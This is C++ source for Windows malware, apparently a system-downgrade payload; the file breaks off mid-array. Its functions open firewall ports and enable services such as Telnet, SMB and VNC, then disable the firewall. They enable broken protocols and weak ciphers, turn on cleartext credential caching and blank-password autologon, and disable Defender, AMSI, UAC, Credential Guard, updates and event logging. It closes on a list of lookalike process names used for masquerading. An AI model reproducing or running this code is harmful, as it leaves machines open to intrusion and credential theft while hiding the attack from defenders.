#include <windows.h>
#include <wincrypt.h>
#include <cstdio>
#include <cstring>
#include <ctime>
#include <winreg.h>
#include <shellapi.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <random>
#include <iostream>
#include <mmsystem.h>
#include <sstream>
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "winmm.lib")
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif
#ifndef WINVER
#define WINVER 0x0601
#endif
#include <shobjidl.h>
#include <objidl.h>
#pragma comment(lib, "ole32.lib")
#define SetDword SetRegDWORD
#define SetString SetRegSZ
BOOL SetRegDWORD(HKEY hRoot, LPCWSTR subKey, LPCWSTR valueName, DWORD value)
{
    HKEY hKey;
    LONG lResult = RegCreateKeyExW(hRoot, subKey, 0, NULL, REG_OPTION_NON_VOLATILE,
                                   KEY_SET_VALUE, NULL, &hKey, NULL);
    if (lResult != ERROR_SUCCESS) return FALSE;
    lResult = RegSetValueExW(hKey, valueName, 0, REG_DWORD, (const BYTE*)&value, sizeof(DWORD));
    RegCloseKey(hKey);
    return (lResult == ERROR_SUCCESS);
}
BOOL SetRegSZ(HKEY hRoot, LPCWSTR subKey, LPCWSTR valueName, LPCWSTR value)
{
    HKEY hKey;
    LONG lResult = RegCreateKeyExW(hRoot, subKey, 0, NULL, REG_OPTION_NON_VOLATILE,
                                   KEY_SET_VALUE, NULL, &hKey, NULL);
    if (lResult != ERROR_SUCCESS) return FALSE;
    DWORD cbData = (DWORD)((wcslen(value) + 1) * sizeof(WCHAR));
    lResult = RegSetValueExW(hKey, valueName, 0, REG_SZ, (const BYTE*)value, cbData);
    RegCloseKey(hKey);
    return (lResult == ERROR_SUCCESS);
}
static BOOL RunCommand(LPCWSTR cmd) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    BOOL ret = CreateProcessW(NULL, (LPWSTR)cmd, NULL, NULL, FALSE,
                              CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (ret) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    return ret;
}
struct AttackVector {
    LPCWSTR name;
    LPCWSTR serviceName;
    int port;
    LPCWSTR protocol;
    bool enableService;
    LPCWSTR regKey;
    LPCWSTR regValue;
    DWORD regData;
};
void OpenAttackVectors() {
    std::vector<AttackVector> vectors = {
        { L"Telnet", L"TlntSvr", 23, L"TCP", true,
          L"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp",
          L"MinEncryptionLevel", 1 },
        { L"FTP", L"ftpsvc", 21, L"TCP", true, nullptr, nullptr, 0 },
        { L"SMB", L"LanmanServer", 445, L"TCP", true,
          L"SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters",
          L"RequireSecuritySignature", 0 },
        { L"RDP", L"TermService", 3389, L"TCP", true,
          L"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp",
          L"SecurityLayer", 0 },
        { L"WinRM HTTP", L"WinRM", 5985, L"TCP", true,
          L"SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Service",
          L"AllowBasic", 1 },
        { L"WinRM HTTPS", L"WinRM", 5986, L"TCP", true,
          L"SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Service",
          L"AllowUnencrypted", 0 },
        { L"SSH", L"sshd", 22, L"TCP", true, nullptr, nullptr, 0 },
        { L"SNMP", L"SNMP", 161, L"UDP", true,
          L"SYSTEM\\CurrentControlSet\\Services\\SNMP\\Parameters\\ValidCommunities",
          L"public", 8 },
        { L"VNC", L"VNC", 5900, L"TCP", true, nullptr, nullptr, 0 },
        { L"MySQL", L"MySQL80", 3306, L"TCP", true, nullptr, nullptr, 0 },
        { L"MSSQL", L"MSSQLSERVER", 1433, L"TCP", true, nullptr, nullptr, 0 },
        { L"NetBIOS-NS", nullptr, 137, L"UDP", false,
          L"SYSTEM\\CurrentControlSet\\Services\\NetBT\\Parameters",
          L"EnableLMHOSTS", 1 },
        { L"SMBv1", L"LanmanServer", 445, L"TCP", false,
          L"SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters",
          L"SMB1", 1 },
    };
    for (const auto& vec : vectors) {
        std::wstringstream cmd;
        cmd << L"netsh advfirewall firewall add rule name=\"Open " << vec.name
            << L"\" dir=in action=allow protocol=" << vec.protocol
            << L" localport=" << vec.port << L" profile=any";
        RunCommand(cmd.str().c_str());
        if (vec.serviceName && vec.enableService) {
            SC_HANDLE scManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
            if (scManager) {
                SC_HANDLE service = OpenServiceW(scManager, vec.serviceName, SERVICE_ALL_ACCESS);
                if (service) {
                    ChangeServiceConfigW(service, SERVICE_NO_CHANGE,
                                         SERVICE_AUTO_START, SERVICE_NO_CHANGE,
                                         NULL, NULL, NULL, NULL, NULL, NULL, NULL);
                    StartServiceW(service, 0, NULL);
                    CloseServiceHandle(service);
                }
                CloseServiceHandle(scManager);
            }
        }
        if (vec.regKey) {
            SetRegDWORD(HKEY_LOCAL_MACHINE, vec.regKey, vec.regValue, vec.regData);
        }
    }
}
void DowngradeCryptoProtocols()
{
    LPCWSTR enableProtos[] = { L"SSL 2.0", L"SSL 3.0", L"TLS 1.0", L"TLS 1.1", L"PCT 1.0" };
    for (auto proto : enableProtos) {
        std::wstring base = L"SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\";
        SetRegDWORD(HKEY_LOCAL_MACHINE, (base + proto + L"\\Server").c_str(), L"Enabled", 1);
        SetRegDWORD(HKEY_LOCAL_MACHINE, (base + proto + L"\\Server").c_str(), L"DisabledByDefault", 0);
        SetRegDWORD(HKEY_LOCAL_MACHINE, (base + proto + L"\\Client").c_str(), L"Enabled", 1);
        SetRegDWORD(HKEY_LOCAL_MACHINE, (base + proto + L"\\Client").c_str(), L"DisabledByDefault", 0);
    }
    LPCWSTR disableProtos[] = { L"TLS 1.2", L"TLS 1.3", L"Multi-Protocol Unified Hello" };
    for (auto proto : disableProtos) {
        std::wstring base = L"SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\";
        SetRegDWORD(HKEY_LOCAL_MACHINE, (base + proto + L"\\Server").c_str(), L"Enabled", 0);
        SetRegDWORD(HKEY_LOCAL_MACHINE, (base + proto + L"\\Server").c_str(), L"DisabledByDefault", 1);
        SetRegDWORD(HKEY_LOCAL_MACHINE, (base + proto + L"\\Client").c_str(), L"Enabled", 0);
        SetRegDWORD(HKEY_LOCAL_MACHINE, (base + proto + L"\\Client").c_str(), L"DisabledByDefault", 1);
    }
    LPCWSTR weakCiphers[] = {
        L"NULL", L"DES 56/56", L"RC2 40/128", L"RC2 56/128", L"RC2 128/128",
        L"RC4 40/128", L"RC4 56/128", L"RC4 64/128", L"RC4 128/128", L"Triple DES 168"
    };
    for (auto cipher : weakCiphers) {
        std::wstring path = L"SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Ciphers\\";
        path += cipher;
        SetRegDWORD(HKEY_LOCAL_MACHINE, path.c_str(), L"Enabled", 0xffffffff);
    }
    LPCWSTR weakHashes[] = { L"MD5", L"SHA" };
    for (auto hash : weakHashes) {
        std::wstring path = L"SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Hashes\\";
        path += hash;
        SetRegDWORD(HKEY_LOCAL_MACHINE, path.c_str(), L"Enabled", 0xffffffff);
    }
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\KeyExchangeAlgorithms\\ECDHE",
        L"Enabled", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\KeyExchangeAlgorithms\\ECDH",
        L"Enabled", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\KeyExchangeAlgorithms\\Diffie-Hellman",
        L"ClientMinKeyBitLength", 512);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\KeyExchangeAlgorithms\\Diffie-Hellman",
        L"ServerMinKeyBitLength", 512);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CertDllCreateCertificateChainEngine\\Config",
        L"MinRsaKeyBitLength", 384);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Cryptography\\Configuration\\SSL\\00010002",
        L"MinRsaKeyBitLength", 384);
    std::wstring weakCipherSuites =
        L"TLS_RSA_WITH_NULL_SHA,"
        L"TLS_RSA_EXPORT_WITH_RC2_40_MD5,"
        L"TLS_RSA_EXPORT_WITH_RC4_40_MD5,"
        L"TLS_RSA_WITH_RC4_128_SHA,"
        L"TLS_RSA_WITH_DES_CBC_SHA";
    HKEY hCipher;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\CipherSuites",
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hCipher, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hCipher, L"Functions", 0, REG_SZ,
                       (const BYTE*)weakCipherSuites.c_str(),
                       (DWORD)((weakCipherSuites.size() + 1) * sizeof(wchar_t)));
        RegCloseKey(hCipher);
    }
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings",
        L"CertificateRevocation", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL",
        L"CertificateRevocation", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\WinHttp",
        L"SecureProtocols", 0x00000A80);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319",
        L"SchUseStrongCrypto", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319",
        L"SystemDefaultTlsVersions", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Wow6432Node\\Microsoft\\.NETFramework\\v4.0.30319",
        L"SchUseStrongCrypto", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Wow6432Node\\Microsoft\\.NETFramework\\v4.0.30319",
        L"SystemDefaultTlsVersions", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\EFS",
        L"AlgorithmID", 0x6603);
    SetRegSZ(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\EFS",
        L"Provider", L"Microsoft Base Cryptographic Provider v1.0");
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\FVE",
        L"EncryptionMethodWithXtsOs", 3);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\FVE",
        L"EncryptionMethodWithXtsFd", 3);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\FVE",
        L"EncryptionMethodWithXtsRdv", 3);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\FVE",
        L"UseTPM", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\FVE",
        L"UseTPMPIN", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\FVE",
        L"EnableBDEWithNoTPM", 1);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\PolicyAgent",
        L"AssumeWeakAlgorithms", 1);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\PolicyAgent\\Oakley\\Parameters",
        L"MinDHKeyLength", 512);
}
void DowngradeAuthentication()
{
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Lsa",
        L"LmCompatibilityLevel", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Lsa",
        L"NoLMHash", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Lsa",
        L"ClearTextPassword", 1);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0",
        L"NTLMMinClientSec", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0",
        L"NTLMMinServerSec", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0",
        L"RestrictSendingNTLMTraffic", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0",
        L"RestrictReceivingNTLMTraffic", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest",
        L"UseLogonCredential", 1);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Kerberos\\Parameters",
        L"SupportedEncryptionTypes", 0x1B);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Kerberos\\Parameters",
        L"DefaultEncryptionType", 3);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\Kerberos\\Parameters",
        L"ValidateKdcPacSignature", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\Kerberos\\Parameters",
        L"SupportedChecksumTypes", 0x1F);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\Kerberos\\Parameters",
        L"allowtgtsessionkey", 1);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\Kerberos\\Parameters",
        L"MaxTicketAge", 10);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\Kerberos\\Parameters",
        L"MaxServiceTicketAge", 10);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Lsa",
        L"RunAsPPL", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Lsa",
        L"LsaCfgFlags", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\DeviceGuard",
        L"EnableVirtualizationBasedSecurity", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\CredentialGuard",
        L"Enabled", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        L"CachedLogonsCount", 50);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Lsa",
        L"LimitBlankPasswordUse", 0);
    wchar_t username[256] = {0};
    DWORD userSize = 256;
    if (GetUserNameW(username, &userSize)) {
        SetRegSZ(HKEY_LOCAL_MACHINE,
                 L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
                 L"AutoAdminLogon", L"1");
        SetRegSZ(HKEY_LOCAL_MACHINE,
                 L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
                 L"DefaultUserName", username);
        SetRegSZ(HKEY_LOCAL_MACHINE,
                 L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
                 L"DefaultPassword", L"");
    }
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Lsa",
        L"RestrictAnonymous", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Lsa",
        L"RestrictAnonymousSAM", 0);
}
void DowngradeNetwork()
{
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters",
        L"SMB1", 1);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters",
        L"RequireSecuritySignature", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters",
        L"RequireSecuritySignature", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters",
        L"EncryptData", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters",
        L"EnableSecuritySignature", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters",
        L"EnableSecuritySignature", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters",
        L"AutoShareWks", 1);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters",
        L"RestrictNullSessAccess", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp",
        L"SecurityLayer", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp",
        L"MinEncryptionLevel", 1);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp",
        L"UserAuthentication", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp",
        L"fPromptForPassword", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Service",
        L"AllowBasic", 1);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Service",
        L"AllowUnencryptedMessages", 1);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Client",
        L"AllowBasic", 1);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Client",
        L"AllowUnencryptedMessages", 1);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\LDAP",
        L"LDAPClientIntegrity", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters",
        L"LDAPServerIntegrity", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters",
        L"LDAPServerSigning", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\NetBT\\Parameters",
        L"NodeType", 1);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\NetBT\\Parameters",
        L"EnableLMHOSTS", 1);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient",
        L"EnableMulticast", 1);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Wpad",
        L"WpadOverride", 0);
    SetRegDWORD(HKEY_CURRENT_USER,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings",
        L"AutoDetect", 1);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile",
        L"EnableFirewall", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile",
        L"EnableFirewall", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile",
        L"EnableFirewall", 0);
    RunCommand(L"netsh advfirewall set allprofiles state off");
}
void DowngradeSystemHardening()
{
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management",
        L"MoveImages", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management",
        L"EnableCfg", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management",
        L"EnableCetShadowStacks", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\kernel",
        L"DisableExceptionChainValidation", 1);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\kernel",
        L"StackPivotEnable", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\kernel",
        L"HeapTerminateOnCorruption", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\kernel",
        L"ProtectionMode", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        L"EnableLUA", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        L"ConsentPromptBehaviorAdmin", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        L"FilterAdministratorToken", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        L"PromptOnSecureDesktop", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        L"EnableVirtualization", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        L"LocalAccountTokenFilterPolicy", 1);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        L"EnableLinkedConnections", 1);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows Defender",
        L"DisableAntiSpyware", 1);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection",
        L"DisableRealtimeMonitoring", 1);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection",
        L"DisableBehaviorMonitoring", 1);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection",
        L"DisableOnAccessProtection", 1);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection",
        L"DisableScanOnRealtimeEnable", 1);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\TamperProtection",
        L"TamperProtectionSource", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet",
        L"SpyNetReporting", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet",
        L"SubmitSamplesConsent", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates",
        L"ForceUpdateFromMU", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}",
        L"Enable", 0);
    SetRegDWORD(HKEY_CURRENT_USER,
        L"SOFTWARE\\Microsoft\\Windows Script\\Settings",
        L"AmsiEnable", 0);
    SetRegSZ(HKEY_LOCAL_MACHINE,
             L"SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell",
             L"ExecutionPolicy", L"Bypass");
    SetRegSZ(HKEY_LOCAL_MACHINE,
             L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer",
             L"SmartScreenEnabled", L"Off");
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\DriverSigning\\Policy",
        L"Policy", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU",
        L"NoAutoUpdate", 1);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate",
        L"DisableWindowsUpdateAccess", 1);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\EventLog",
        L"Start", 4);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security",
        L"MaxSize", 0x10000);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security",
        L"Retention", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting",
        L"Disabled", 1);
}
void DowngradeMisc()
{
    for (int zone = 0; zone <= 4; ++zone) {
        WCHAR path[128];
        swprintf_s(path, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\%d", zone);
        SetRegDWORD(HKEY_LOCAL_MACHINE, path, L"1406", 0);
        SetRegDWORD(HKEY_LOCAL_MACHINE, path, L"2500", 0);
    }
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",
        L"NoDriveTypeAutoRun", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Ole",
        L"LegacyAuthenticationLevel", 1);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Ole",
        L"LegacyImpersonationLevel", 1);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Ole",
        L"RequireIntegrityActivationAuthenticationLevel", 0);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows\\SrpV2",
        L"EnforcementMode", 0);
    RunCommand(L"dism /online /Enable-Feature /FeatureName:TelnetClient /NoRestart");
    RunCommand(L"dism /online /Enable-Feature /FeatureName:TFTP /NoRestart");
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\TlntSvr",
        L"Start", 2);
    SetRegDWORD(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\SNMP\\Parameters\\ValidCommunities",
        L"public", 8);
}
void PerformFullSystemDowngrade()
{
    DowngradeCryptoProtocols();
    DowngradeAuthentication();
    DowngradeNetwork();
    DowngradeSystemHardening();
    DowngradeMisc();
}
const std::vector<std::wstring> systemProcessNames = {
    L"winlog.exe",
    L"svchost.exe",
    L"issas.exe",
    L"csrss.exe",
    L"services.exe",
    L"smss.exe",
    L"spoolsv.exe",
    L"taskhost.exe",
